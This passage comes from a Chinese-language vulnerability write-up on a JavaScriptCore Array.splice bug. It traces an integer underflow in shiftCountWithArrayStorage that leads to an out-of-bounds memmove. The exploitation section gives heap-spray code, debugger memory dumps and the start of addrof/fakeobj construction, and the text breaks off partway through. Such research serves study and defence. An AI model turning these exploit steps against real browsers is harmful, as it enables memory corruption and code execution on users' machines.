<span class="w">        </span><span class="k">unsigned</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">k</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">currentCount</span><span class="p">;</span>
<span class="w">        </span><span class="k">unsigned</span><span class="w"> </span><span class="k">to</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">k</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">resultCount</span><span class="p">;</span>
<span class="w">        </span><span class="n">JSValue</span><span class="w"> </span><span class="k">value</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">getProperty</span><span class="p">(</span><span class="n">exec</span><span class="p">,</span><span class="w"> </span><span class="n">thisObj</span><span class="p">,</span><span class="w"> </span><span class="k">from</span><span class="p">);</span>
<span class="w">        </span><span class="n">RETURN_IF_EXCEPTION</span><span class="p">(</span><span class="n">scope</span><span class="p">,</span><span class="w"> </span><span class="n">void</span><span class="p">());</span>
<span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="k">value</span><span class="p">)</span><span class="w"> </span><span class="err">{</span>
<span class="w">            </span><span class="n">thisObj</span><span class="o">-&gt;</span><span class="n">putByIndexInline</span><span class="p">(</span><span class="n">exec</span><span class="p">,</span><span class="w"> </span><span class="k">to</span><span class="p">,</span><span class="w"> </span><span class="k">value</span><span class="p">,</span><span class="w"> </span><span class="no">true</span><span class="p">);</span>
<span class="w">            </span><span class="n">RETURN_IF_EXCEPTION</span><span class="p">(</span><span class="n">scope</span><span class="p">,</span><span class="w"> </span><span class="n">void</span><span class="p">());</span>
<span class="w">        </span><span class="err">}</span><span class="w"> </span><span class="k">else</span><span class="w"> </span><span class="err">{</span>
<span class="w">            </span><span class="kt">bool</span><span class="w"> </span><span class="n">success</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">thisObj</span><span class="o">-&gt;</span><span class="n">methodTable</span><span class="p">(</span><span class="n">vm</span><span class="p">)</span><span class="o">-&gt;</span><span class="n">deletePropertyByIndex</span><span class="p">(</span><span class="n">thisObj</span><span class="p">,</span><span class="w"> </span><span class="n">exec</span><span class="p">,</span><span class="w"> </span><span class="k">to</span><span class="p">);</span>
<span class="w">            </span><span class="n">RETURN_IF_EXCEPTION</span><span class="p">(</span><span class="n">scope</span><span class="p">,</span><span class="w"> </span><span class="n">void</span><span class="p">());</span>
<span class="w">            </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="o">!</span><span class="n">success</span><span class="p">)</span><span class="w"> </span><span class="err">{</span>
<span class="w">                </span><span class="n">throwTypeError</span><span class="p">(</span><span class="n">exec</span><span class="p">,</span><span class="w"> </span><span class="n">scope</span><span class="p">,</span><span class="w"> </span><span class="n">UnableToDeletePropertyError</span><span class="p">);</span>
<span class="w">                </span><span class="k">return</span><span class="p">;</span>
<span class="w">            </span><span class="err">}</span>
<span class="w">        </span><span class="err">}</span>
<span class="w">    </span><span class="err">}</span>
<span class="w">    </span><span class="k">for</span><span class="w"> </span><span class="p">(</span><span class="k">unsigned</span><span class="w"> </span><span class="n">k</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">length</span><span class="p">;</span><span class="w"> </span><span class="n">k</span><span class="w"> </span><span class="o">&gt;</span><span class="w"> </span><span class="n">length</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="n">count</span><span class="p">;</span><span class="w"> </span><span class="o">--</span><span class="n">k</span><span class="p">)</span><span class="w"> </span><span class="err">{</span>
<span class="w">        </span><span class="o">//</span><span class="w"> </span>
<span class="w">        </span><span class="kt">bool</span><span class="w"> </span><span class="n">success</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">thisObj</span><span class="o">-&gt;</span><span class="n">methodTable</span><span class="p">(</span><span class="n">vm</span><span class="p">)</span><span class="o">-&gt;</span><span class="n">deletePropertyByIndex</span><span class="p">(</span><span class="n">thisObj</span><span class="p">,</span><span class="w"> </span><span class="n">exec</span><span class="p">,</span><span class="w"> </span><span class="n">k</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="mi">1</span><span class="p">);</span>
<span class="w">        </span><span class="n">RETURN_IF_EXCEPTION</span><span class="p">(</span><span class="n">scope</span><span class="p">,</span><span class="w"> </span><span class="n">void</span><span class="p">());</span>
<span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="o">!</span><span class="n">success</span><span class="p">)</span><span class="w"> </span><span class="err">{</span>
<span class="w">            </span><span class="n">throwTypeError</span><span class="p">(</span><span class="n">exec</span><span class="p">,</span><span class="w"> </span><span class="n">scope</span><span class="p">,</span><span class="w"> </span><span class="n">UnableToDeletePropertyError</span><span class="p">);</span>
<span class="w">            </span><span class="k">return</span><span class="p">;</span>
<span class="w">        </span><span class="err">}</span>
<span class="w">    </span><span class="err">}</span>
<span class="err">}</span>
<span class="n">JSArray</span><span class="o">::</span><span class="n">ShiftCountForSplice</span><span class="n n-Quoted">` 实现在`</span><span class="k">Source</span><span class="o">/</span><span class="n">JavaScriptCore</span><span class="o">/</span><span class="n">runtime</span><span class="o">/</span><span class="n">JSArray</span><span class="p">.</span><span class="n">h</span><span class="o">:</span><span class="mi">125</span><span class="n n-Quoted">`, `</span><span class="n">shiftCountWithAnyIndexingType</span><span class="n n-Quoted">` 根据 array 的类型做不同的处理，这里我们是`</span><span class="n">ArrayWithArrayStorage</span><span class="n n-Quoted">`, 直接调用`</span><span class="n">shiftCountWithArrayStorage</span>
<span class="kt">bool</span><span class="w"> </span><span class="n">shiftCountForSplice</span><span class="p">(</span><span class="n">ExecState</span><span class="o">*</span><span class="w"> </span><span class="n">exec</span><span class="p">,</span><span class="w"> </span><span class="k">unsigned</span><span class="o">&amp;</span><span class="w"> </span><span class="n">startIndex</span><span class="p">,</span><span class="w"> </span><span class="k">unsigned</span><span class="w"> </span><span class="n">count</span><span class="p">)</span><span class="w">        </span>
<span class="err">{</span><span class="w">                                                                                      </span>
<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="n">shiftCountWithAnyIndexingType</span><span class="p">(</span><span class="n">exec</span><span class="p">,</span><span class="w"> </span><span class="n">startIndex</span><span class="p">,</span><span class="w"> </span><span class="n">count</span><span class="p">);</span><span class="w">                     </span>
<span class="err">}</span><span class="w">                                                                                      </span>
<span class="o">//</span><span class="p">.................</span>

<span class="kt">bool</span><span class="w"> </span><span class="n">JSArray</span><span class="o">::</span><span class="n">shiftCountWithAnyIndexingType</span><span class="p">(</span><span class="n">ExecState</span><span class="o">*</span><span class="w"> </span><span class="n">exec</span><span class="p">,</span><span class="w"> </span><span class="k">unsigned</span><span class="o">&amp;</span><span class="w"> </span><span class="n">startIndex</span><span class="p">,</span><span class="w"> </span><span class="k">unsigned</span><span class="w"> </span><span class="n">count</span><span class="p">)</span>
<span class="err">{</span>
<span class="w">    </span><span class="n">VM</span><span class="o">&amp;</span><span class="w"> </span><span class="n">vm</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">exec</span><span class="o">-&gt;</span><span class="n">vm</span><span class="p">();</span>
<span class="w">    </span><span class="n">RELEASE_ASSERT</span><span class="p">(</span><span class="n">count</span><span class="w"> </span><span class="o">&gt;</span><span class="w"> </span><span class="mi">0</span><span class="p">);</span>

<span class="w">    </span><span class="n">ensureWritable</span><span class="p">(</span><span class="n">vm</span><span class="p">);</span>

<span class="w">    </span><span class="n">Butterfly</span><span class="o">*</span><span class="w"> </span><span class="n">butterfly</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">this</span><span class="o">-&gt;</span><span class="n">butterfly</span><span class="p">();</span>

<span class="w">    </span><span class="n">switch</span><span class="w"> </span><span class="p">(</span><span class="n">indexingType</span><span class="p">())</span><span class="w"> </span><span class="err">{</span>
<span class="w">    </span><span class="k">case</span><span class="w"> </span><span class="n">ArrayClass</span><span class="o">:</span>
<span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="no">true</span><span class="p">;</span>

<span class="w">    </span><span class="k">case</span><span class="w"> </span><span class="n">ArrayWithUndecided</span><span class="o">:</span>
<span class="w">        </span><span class="o">//</span><span class="w"> </span><span class="n">Don</span><span class="s1">&#39;t handle this because it&#39;</span><span class="n">s</span><span class="w"> </span><span class="n">confusing</span><span class="w"> </span><span class="k">and</span><span class="w"> </span><span class="n">it</span><span class="w"> </span><span class="n">shouldn</span><span class="s1">&#39;t come up.</span>
<span class="s1">        return false;</span>

<span class="s1">    case ArrayWithInt32:</span>
<span class="s1">    case ArrayWithContiguous: {</span>
<span class="s1">        unsigned oldLength = butterfly-&gt;publicLength();</span>
<span class="s1">    //...</span>
<span class="s1">        return true;</span>
<span class="s1">    }</span>

<span class="s1">    case ArrayWithDouble: {</span>
<span class="s1">        unsigned oldLength = butterfly-&gt;publicLength();</span>
<span class="s1">        RELEASE_ASSERT(count &lt;= oldLength);</span>
<span class="s1">        //...</span>
<span class="s1">        return true;</span>
<span class="s1">    }</span>

<span class="s1">    case ArrayWithArrayStorage:</span>
<span class="s1">    case ArrayWithSlowPutArrayStorage:</span>
<span class="s1">        return shiftCountWithArrayStorage(vm, startIndex, count, arrayStorage());</span>

<span class="s1">    default:</span>
<span class="s1">        CRASH();</span>
<span class="s1">        return false;</span>
<span class="s1">    }</span>
<span class="s1">}</span>
</code></pre></div>

<p>这里就是漏洞点了，前面提到<code>holesMustForwardToPrototype</code> 会返回false,
这样就会进入到后面的逻辑</p>
<div class="codehilite"><pre><span></span><code><span class="kt">bool</span><span class="w"> </span><span class="nx">JSArray</span><span class="o">::</span><span class="nx">shiftCountWithArrayStorage</span><span class="p">(</span><span class="nx">VM</span><span class="o">&amp;</span><span class="w"> </span><span class="nx">vm</span><span class="p">,</span><span class="w"> </span><span class="nx">unsigned</span><span class="w"> </span><span class="nx">startIndex</span><span class="p">,</span><span class="w"> </span><span class="nx">unsigned</span><span class="w"> </span><span class="nx">count</span><span class="p">,</span><span class="w"> </span><span class="nx">ArrayStorage</span><span class="o">*</span><span class="w"> </span><span class="nx">storage</span><span class="p">)</span>
<span class="p">{</span>
<span class="w">    </span><span class="nx">unsigned</span><span class="w"> </span><span class="nx">oldLength</span><span class="w"> </span><span class="p">=</span><span class="w"> </span><span class="nx">storage</span><span class="o">-&gt;</span><span class="nx">length</span><span class="p">();</span>
<span class="w">    </span><span class="nx">RELEASE_ASSERT</span><span class="p">(</span><span class="nx">count</span><span class="w"> </span><span class="o">&lt;=</span><span class="w"> </span><span class="nx">oldLength</span><span class="p">);</span>

<span class="w">    </span><span class="c1">// If the array contains holes or is otherwise in an abnormal state,</span>
<span class="w">    </span><span class="c1">// use the generic algorithm in ArrayPrototype.</span>
<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">((</span><span class="nx">storage</span><span class="o">-&gt;</span><span class="nx">hasHoles</span><span class="p">()</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="nx">this</span><span class="o">-&gt;</span><span class="nx">structure</span><span class="p">(</span><span class="nx">vm</span><span class="p">)</span><span class="o">-&gt;</span><span class="nx">holesMustForwardToPrototype</span><span class="p">(</span><span class="nx">vm</span><span class="p">,</span><span class="w"> </span><span class="nx">this</span><span class="p">))</span><span class="w"> </span>
<span class="w">        </span><span class="o">||</span><span class="w"> </span><span class="nx">hasSparseMap</span><span class="p">()</span><span class="w"> </span>
<span class="w">        </span><span class="o">||</span><span class="w"> </span><span class="nx">shouldUseSlowPut</span><span class="p">(</span><span class="nx">indexingType</span><span class="p">()))</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="kc">false</span><span class="p">;</span>
<span class="w">    </span><span class="p">}</span>

<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(!</span><span class="nx">oldLength</span><span class="p">)</span>
<span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="kc">true</span><span class="p">;</span>
<span class="w">    </span><span class="c1">//count = 0x11, oldlength = 0x100000, length = 0xfffef</span>
<span class="w">    </span><span class="nx">unsigned</span><span class="w"> </span><span class="nx">length</span><span class="w"> </span><span class="p">=</span><span class="w"> </span><span class="nx">oldLength</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="nx">count</span><span class="p">;</span>
<span class="w">    </span><span class="c1">// m_numValuesInVector = 1, 计算之后 m_numValuesInVector = 0xfffffff0</span>
<span class="w">    </span><span class="nx">storage</span><span class="o">-&gt;</span><span class="nx">m_numValuesInVector</span><span class="w"> </span><span class="o">-=</span><span class="w"> </span><span class="nx">count</span><span class="p">;</span>
<span class="w">    </span><span class="nx">storage</span><span class="o">-&gt;</span><span class="nx">setLength</span><span class="p">(</span><span class="nx">length</span><span class="p">);</span>
</code></pre></div>

<p>这里运行结束后<code>a.length = 0xfffef</code>,
<code>storage.m_numValuesInVector = 0xfffffff0</code>, 然后 poc
下一步设置<code>a.length = 0xfffffff0</code>, 这样就有
<code>a.length == storage.m_numValuesInVector</code>, 这样<code>hasHoles</code>
后续都会返回false</p>
<div class="codehilite"><pre><span></span><code><span class="nb nb-Type">bool</span><span class="w"> </span><span class="n">hasHoles</span><span class="p">()</span><span class="w"> </span><span class="k">const</span><span class="w">                         </span>
<span class="p">{</span><span class="w">                                             </span>
<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="n">m_numValuesInVector</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="n">length</span><span class="p">();</span><span class="w">   </span>
<span class="p">}</span>
</code></pre></div>

<p>最后一步<code>a.splice(0xfffffff0, 0, 1);</code>,
<code>itemCount == 1 &gt; actualDeleteCount == 0</code>, 于是就会进入 <code>unshift</code> 函数，
和 shift 函数类似，这里最终会进入 <code>JSArray</code>
的<code>unshiftCountWithArrayStorage</code></p>
<p>因为 <code>storage-&gt;hasHoles()</code> 返回的是 false,
所以可以进入后面的判断，要添加的item 比
delete的多，那么就需要扩大原来的内存，后续的内存操作会出现问题，最终<code>segmentfault</code></p>
<div class="codehilite"><pre><span></span><code><span class="kt">bool</span><span class="w"> </span><span class="nx">JSArray</span><span class="o">::</span><span class="nx">unshiftCountWithArrayStorage</span><span class="p">(</span><span class="nx">ExecState</span><span class="o">*</span><span class="w"> </span><span class="nx">exec</span><span class="p">,</span><span class="w"> </span><span class="nx">unsigned</span><span class="w"> </span><span class="nx">startIndex</span><span class="p">,</span><span class="w"> </span><span class="nx">unsigned</span><span class="w"> </span><span class="nx">count</span><span class="p">,</span><span class="w"> </span><span class="nx">ArrayStorage</span><span class="o">*</span><span class="w"> </span><span class="nx">storage</span><span class="p">)</span>
<span class="p">{</span>
<span class="c1">//..</span>

<span class="w">    </span><span class="c1">// If the array contains holes or is otherwise in an abnormal state,</span>
<span class="w">    </span><span class="c1">// use the generic algorithm in ArrayPrototype.</span>
<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="nx">storage</span><span class="o">-&gt;</span><span class="nx">hasHoles</span><span class="p">()</span><span class="w"> </span><span class="o">||</span><span class="w"> </span><span class="nx">storage</span><span class="o">-&gt;</span><span class="nx">inSparseMode</span><span class="p">()</span><span class="w"> </span><span class="o">||</span><span class="w"> </span><span class="nx">shouldUseSlowPut</span><span class="p">(</span><span class="nx">indexingType</span><span class="p">()))</span>
<span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="kc">false</span><span class="p">;</span>

<span class="w">    </span><span class="kt">bool</span><span class="w"> </span><span class="nx">moveFront</span><span class="w"> </span><span class="p">=</span><span class="w"> </span><span class="p">!</span><span class="nx">startIndex</span><span class="w"> </span><span class="o">||</span><span class="w"> </span><span class="nx">startIndex</span><span class="w"> </span><span class="p">&lt;</span><span class="w"> </span><span class="nx">length</span><span class="w"> </span><span class="o">/</span><span class="w"> </span><span class="mi">2</span><span class="p">;</span>

<span class="w">    </span><span class="nx">unsigned</span><span class="w"> </span><span class="nx">vectorLength</span><span class="w"> </span><span class="p">=</span><span class="w"> </span><span class="nx">storage</span><span class="o">-&gt;</span><span class="nx">vectorLength</span><span class="p">();</span>

<span class="w">    </span><span class="c1">// Need to have GC deferred around the unshiftCountSlowCase(), since that leaves the butterfly in</span>
<span class="w">    </span><span class="c1">// a weird state: some parts of it will be left uninitialized, which we will fill in here.</span>
<span class="w">    </span><span class="nx">DeferGC</span><span class="w"> </span><span class="nx">deferGC</span><span class="p">(</span><span class="nx">vm</span><span class="p">.</span><span class="nx">heap</span><span class="p">);</span>
<span class="w">    </span><span class="kt">auto</span><span class="w"> </span><span class="nx">locker</span><span class="w"> </span><span class="p">=</span><span class="w"> </span><span class="nx">holdLock</span><span class="p">(</span><span class="nx">cellLock</span><span class="p">());</span>

<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="nx">moveFront</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="nx">storage</span><span class="o">-&gt;</span><span class="nx">m_indexBias</span><span class="w"> </span><span class="o">&gt;=</span><span class="w"> </span><span class="nx">count</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="nx">Butterfly</span><span class="o">*</span><span class="w"> </span><span class="nx">newButterfly</span><span class="w"> </span><span class="p">=</span><span class="w"> </span><span class="nx">storage</span><span class="o">-&gt;</span><span class="nx">butterfly</span><span class="p">()</span><span class="o">-&gt;</span><span class="nx">unshift</span><span class="p">(</span><span class="nx">structure</span><span class="p">(</span><span class="nx">vm</span><span class="p">),</span><span class="w"> </span><span class="nx">count</span><span class="p">);</span>
<span class="w">        </span><span class="nx">storage</span><span class="w"> </span><span class="p">=</span><span class="w"> </span><span class="nx">newButterfly</span><span class="o">-&gt;</span><span class="nx">arrayStorage</span><span class="p">();</span>
<span class="w">        </span><span class="nx">storage</span><span class="o">-&gt;</span><span class="nx">m_indexBias</span><span class="w"> </span><span class="o">-=</span><span class="w"> </span><span class="nx">count</span><span class="p">;</span>
<span class="w">        </span><span class="nx">storage</span><span class="o">-&gt;</span><span class="nx">setVectorLength</span><span class="p">(</span><span class="nx">vectorLength</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="nx">count</span><span class="p">);</span>
<span class="w">        </span><span class="nx">setButterfly</span><span class="p">(</span><span class="nx">vm</span><span class="p">,</span><span class="w"> </span><span class="nx">newButterfly</span><span class="p">);</span>
<span class="w">    </span><span class="p">}</span><span class="w"> </span><span class="k">else</span><span class="w"> </span><span class="k">if</span><span class="w"> </span><span class="p">(!</span><span class="nx">moveFront</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="nx">vectorLength</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="nx">length</span><span class="w"> </span><span class="o">&gt;=</span><span class="w"> </span><span class="nx">count</span><span class="p">)</span>
<span class="w">        </span><span class="nx">storage</span><span class="w"> </span><span class="p">=</span><span class="w"> </span><span class="nx">storage</span><span class="o">-&gt;</span><span class="nx">butterfly</span><span class="p">()</span><span class="o">-&gt;</span><span class="nx">arrayStorage</span><span class="p">();</span>
<span class="w">    </span><span class="k">else</span><span class="w"> </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="nx">unshiftCountSlowCase</span><span class="p">(</span><span class="nx">locker</span><span class="p">,</span><span class="w"> </span><span class="nx">vm</span><span class="p">,</span><span class="w"> </span><span class="nx">deferGC</span><span class="p">,</span><span class="w"> </span><span class="nx">moveFront</span><span class="p">,</span><span class="w"> </span><span class="nx">count</span><span class="p">))</span>
<span class="w">        </span><span class="nx">storage</span><span class="w"> </span><span class="p">=</span><span class="w"> </span><span class="nx">arrayStorage</span><span class="p">();</span><span class="c1">// 0x60 </span>
<span class="w">    </span><span class="k">else</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="nx">throwOutOfMemoryError</span><span class="p">(</span><span class="nx">exec</span><span class="p">,</span><span class="w"> </span><span class="nx">scope</span><span class="p">);</span>
<span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="kc">true</span><span class="p">;</span>
<span class="w">    </span><span class="p">}</span>

<span class="w">    </span><span class="nx">WriteBarrier</span><span class="p">&lt;</span><span class="nx">Unknown</span><span class="p">&gt;</span><span class="o">*</span><span class="w"> </span><span class="nx">vector</span><span class="w"> </span><span class="p">=</span><span class="w"> </span><span class="nx">storage</span><span class="o">-&gt;</span><span class="nx">m_vector</span><span class="p">;</span>

<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="nx">startIndex</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="nx">moveFront</span><span class="p">)</span>
<span class="w">            </span><span class="nx">memmove</span><span class="p">(</span><span class="nx">vector</span><span class="p">,</span><span class="w"> </span><span class="nx">vector</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="nx">count</span><span class="p">,</span><span class="w"> </span><span class="nx">startIndex</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="nx">sizeof</span><span class="p">(</span><span class="nx">JSValue</span><span class="p">));</span>
<span class="w">        </span><span class="k">else</span><span class="w"> </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="nx">length</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="nx">startIndex</span><span class="p">)</span>
<span class="w">            </span><span class="nx">memmove</span><span class="p">(</span><span class="nx">vector</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="nx">startIndex</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="nx">count</span><span class="p">,</span><span class="w"> </span><span class="nx">vector</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="nx">startIndex</span><span class="p">,</span><span class="w"> </span><span class="p">(</span><span class="nx">length</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="nx">startIndex</span><span class="p">)</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="nx">sizeof</span><span class="p">(</span><span class="nx">JSValue</span><span class="p">));</span>
<span class="w">    </span><span class="p">}</span>

<span class="w">    </span><span class="k">for</span><span class="w"> </span><span class="p">(</span><span class="nx">unsigned</span><span class="w"> </span><span class="nx">i</span><span class="w"> </span><span class="p">=</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span><span class="w"> </span><span class="nx">i</span><span class="w"> </span><span class="p">&lt;</span><span class="w"> </span><span class="nx">count</span><span class="p">;</span><span class="w"> </span><span class="nx">i</span><span class="o">++</span><span class="p">)</span>
<span class="w">        </span><span class="nx">vector</span><span class="p">[</span><span class="nx">i</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="nx">startIndex</span><span class="p">].</span><span class="nx">clear</span><span class="p">();</span>

<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="kc">true</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div>

<h3 id="_7">漏洞利用<a class="headerlink" href="#_7" title="Permanent link">&para;</a></h3>
<p>okay， 漏洞发生的原因大概清楚了，我们再来看看要怎么样利用。我们可以发现
<code>unshiftCountWithArrayStorage</code> 有一个 <code>memmove</code> 的操作，
假如执行<code>a.splice(0x1000,0,1)</code>, <code>startIndex == 0x1000</code>,
<code>moveFront == true</code> , <code>count = 1</code></p>
<div class="codehilite"><pre><span></span><code>if (startIndex) {
        if (moveFront)
            memmove(vector, vector + count, startIndex <span class="gs">* sizeof(JSValue));</span>
<span class="gs">        else if (length - startIndex)</span>
<span class="gs">            memmove(vector + startIndex + count, vector + startIndex, (length - startIndex) *</span> sizeof(JSValue));
    }
</code></pre></div>

<p>vector 来自前面的<code>storage</code> , 这里会进入 <code>storage = arrayStorage();</code>
重新初始化一个 storage,
可以跟踪一下<code>Source/JavaScriptCore/runtime/ButterflyInlines.h:77</code>
的<code>Butterfly::tryCreateUninitialized</code> 函数，最终分配的内存大小是
0x60(0x58 向上对齐)。但是 因为这里<code>startIndex</code>
可以控制，于是这里就可以越界做内存拷贝。</p>
<div class="codehilite"><pre><span></span><code>if (moveFront &amp;&amp; storage-&gt;m_indexBias &gt;= count) {//m_indexBias ==0 &lt; count ==1
        Butterfly* newButterfly = storage-&gt;butterfly()-&gt;unshift(structure(vm), count);
        storage = newButterfly-&gt;arrayStorage();
        storage-&gt;m_indexBias -= count;
        storage-&gt;setVectorLength(vectorLength + count);
        setButterfly(vm, newButterfly);
    } else if (!moveFront &amp;&amp; vectorLength - length &gt;= count)// moveFront == true
        storage = storage-&gt;butterfly()-&gt;arrayStorage();
    else if (unshiftCountSlowCase(locker, vm, deferGC, moveFront, count))
        storage = arrayStorage();// 0x60 
    else {
        throwOutOfMemoryError(exec, scope);
        return true;
    }

    WriteBarrier&lt;Unknown&gt;* vector = storage-&gt;m_vector;
</code></pre></div>

<p>如果内存布局像下面这样,</p>
<div class="codehilite"><pre><span></span><code>vector = 0x7fe000287a78
pwndbg&gt; x/1000gx 0x7fe000287a78
0x7fe000287a78: 0x00000000badbeef0      0x0000000000000000
0x7fe000287a88: 0x00000000badbeef0      0x00000000badbeef0
0x7fe000287a98: 0x00000000badbeef0      0x00000000badbeef0
//..
// 其他 object 的 butterfly,  length = 0xa
0x7fe000287ff8: 0x00000000badbeef0      0x0000000d0000000a
0x7fe000288008: 0x0000000000001337      0x402abd70a3d70a3d
0x7fe000288018: 0x402abd70a3d70a3d      0x402abd70a3d70a3d
// vector + 0x1000
0x7fe000288a78: 0x0000000000000000      0x0000000d0000000a
0x7fe000288a88: 0x0000000000001337      0x402abd70a3d70a3d
</code></pre></div>

<p>memmove之后, 可以把其他object 的 <code>buttefly</code> 的 length
改了，假如可以找到这个 object， 那么就可以利用这个 object
来构造越界读写了。</p>
<div class="codehilite"><pre><span></span><code><span class="c1">// vector</span>
<span class="mi">0</span><span class="n">x7fe000287a78</span><span class="p">:</span><span class="w"> </span><span class="mi">0</span><span class="n">x0000000000000000</span><span class="w">      </span><span class="mi">0</span><span class="n">x00000000badbeef0</span>
<span class="mi">0</span><span class="n">x7fe000287a88</span><span class="p">:</span><span class="w"> </span><span class="mi">0</span><span class="n">x00000000badbeef0</span><span class="w">      </span><span class="mi">0</span><span class="n">x00000000badbeef0</span>
<span class="c1">// 其他 object 的 butterfly,  length = 0x1337</span>
<span class="mi">0</span><span class="n">x7fe000287ff8</span><span class="p">:</span><span class="w"> </span><span class="mi">0</span><span class="n">x0000000d0000000a</span><span class="w">      </span><span class="mi">0</span><span class="n">x0000000000001337</span>
<span class="mi">0</span><span class="n">x7fe000288008</span><span class="p">:</span><span class="w"> </span><span class="mi">0</span><span class="n">x402abd70a3d70a3d</span><span class="w">      </span><span class="mi">0</span><span class="n">x402abd70a3d70a3d</span>
<span class="c1">// vector + 0x1000</span>
<span class="mi">0</span><span class="n">x7fe000288a78</span><span class="p">:</span><span class="w"> </span><span class="mi">0</span><span class="n">x0000000d0000000a</span><span class="w">      </span><span class="mi">0</span><span class="n">x0000000000001337</span>
<span class="mi">0</span><span class="n">x7fe000288a88</span><span class="p">:</span><span class="w"> </span><span class="mi">0</span><span class="n">x402abd70a3d70a3d</span><span class="w">      </span><span class="mi">0</span><span class="n">x402abd70a3d70a3d</span>
</code></pre></div>

<h4 id="addrof-fakeobj">addrof 和 fakeobj 构造<a class="headerlink" href="#addrof-fakeobj" title="Permanent link">&para;</a></h4>
<p>首先喷一堆的object， 尝试构造出上面提到的内存布局，length都是 10，
这样新分配的内存就是 <code>10 * 8 + 0x10 = 0x60</code>, 就会和新申请的<code>storage</code>
分配在十分接近的内存上。 <code>spray[i]</code> 和 <code>spray[i+1]</code> 会连续分配</p>
<div class="codehilite"><pre><span></span><code><span class="k">for</span><span class="w"> </span><span class="p">(</span><span class="n">let</span><span class="w"> </span><span class="n">i</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span><span class="w"> </span><span class="n">i</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="mh">0x3000</span><span class="p">;</span><span class="w"> </span><span class="n">i</span><span class="w"> </span><span class="o">+=</span><span class="w"> </span><span class="mi">2</span><span class="p">)</span><span class="w"> </span><span class="err">{</span><span class="w">                                                   </span>
<span class="w">    </span><span class="n">spray</span><span class="o">[</span><span class="n">i</span><span class="o">]</span><span class="w">   </span><span class="o">=</span><span class="w"> </span><span class="o">[</span><span class="n">13.37,13.37,13.37,13.37,13.37,13.37,13.37,13.37,13.37,13.37+i</span><span class="o">]</span><span class="p">;</span><span class="w">       </span>
<span class="w">    </span><span class="n">spray</span><span class="o">[</span><span class="n">i+1</span><span class="o">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="o">[</span><span class="n">{},{},{},{},{},{},{},{},{},{}</span><span class="o">]</span><span class="p">;</span><span class="w">  </span><span class="o">//</span><span class="w"> </span><span class="n">fakeobj</span><span class="w">                              </span>
<span class="err">}</span><span class="w">                                                                                       </span>
<span class="k">for</span><span class="w"> </span><span class="p">(</span><span class="n">let</span><span class="w"> </span><span class="n">i</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span><span class="w"> </span><span class="n">i</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="mh">0x3000</span><span class="p">;</span><span class="w"> </span><span class="n">i</span><span class="w"> </span><span class="o">+=</span><span class="w"> </span><span class="mi">2</span><span class="p">)</span><span class="w">                                                     </span>
<span class="w">    </span><span class="n">spray</span><span class="o">[</span><span class="n">i</span><span class="o">][</span><span class="n">0</span><span class="o">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">i2f</span><span class="p">(</span><span class="mh">0x1337</span><span class="p">)</span>
</code></pre></div>

<p>然后是 splice(0x1000,0,1) 触发<code>memmove</code>, 然后找出那个被改了 size 的
object</p>
